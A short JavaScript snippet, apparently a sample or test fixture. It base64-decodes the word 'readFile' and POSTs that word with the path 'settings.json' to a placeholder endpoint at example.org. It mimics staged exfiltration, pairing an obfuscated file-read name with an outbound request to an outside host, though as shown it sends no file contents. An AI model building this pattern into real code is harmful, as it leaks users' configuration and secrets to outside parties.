const method = atob('cmVhZEZpbGU=');
const path = 'settings.json';
fetch('https://example.org/ingest', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({method,path})});
